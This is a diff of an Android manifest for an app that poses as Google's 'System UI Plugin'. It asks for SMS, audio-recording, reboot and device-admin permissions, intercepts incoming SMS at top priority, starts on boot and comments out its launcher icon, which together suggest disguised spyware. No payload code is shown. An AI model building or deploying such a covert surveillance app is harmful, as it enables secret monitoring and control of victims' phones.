@@ -1,53 +1,63 @@
 <manifest
-	xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.google.android.systemUi">
-	
-	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE" />
-    <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-	<uses-permission android:name="android.permission.REBOOT" />
-	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-	<uses-permission android:name="android.permission.SEND_SMS"/>
-	<uses-permission android:name="android.permission.RECEIVE_SMS" />
-	<uses-permission android:name="android.permission.BLUETOOTH"/>
-	<uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
-	
-	<application
-		android:label="System UI Plugin">
-		<service
-			android:name=".service.CommunicationService" 
-			android:label="System Communication"
-		/>
-		<receiver android:name=".receiver.NetworkStatusReceiver">
-			<intent-filter>
-				<action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
-				<action android:name="android.net.wifi.STATE_CHANGE" />
-				<action android:name="android.net.wifi.p2p.CONNECTION_STATE_CHANGE" />
-				<action android:name="android.intent.action.BOOT_COMPLETED" />
-			</intent-filter>
-		</receiver>
-		<receiver 
-			android:name=".receiver.DeviceAdmin"
-			android:label="@string/app_name"
-			android:description="@string/device_admin_description"
-			android:permission="android.permission.BIND_DEVICE_ADMIN">
-			<meta-data
-				android:name="android.app.device_admin"
-				android:resource="@xml/device_admin"
-			/>
-			<intent-filter>
-				<action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-			</intent-filter>
-		</receiver>
-		<receiver android:name=".receiver.SmsReceiver" android:enabled="true">
-            <intent-filter android:priority="1000">
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.google.android.systemUi">
+
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.REBOOT"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+
+    <application
+        android:label="System UI Plugin">
+        <!--<activity android:name=".activity.Starter">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            </activity>-->
+        <service
+            android:name=".service.CommunicationService"
+            android:label="System Communication"
+            />
+
+        <receiver android:name=".receiver.NetworkStatusReceiver">
+            <intent-filter>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.net.wifi.STATE_CHANGE"/>
+                <action android:name="android.net.wifi.p2p.CONNECTION_STATE_CHANGE"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
         </receiver>
-	</application>
+        <receiver
+            android:name=".receiver.DeviceAdmin"
+            android:description="@string/device_admin_description"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin"
+                />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name=".receiver.SmsReceiver"
+            android:enabled="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+    </application>
 </manifest>
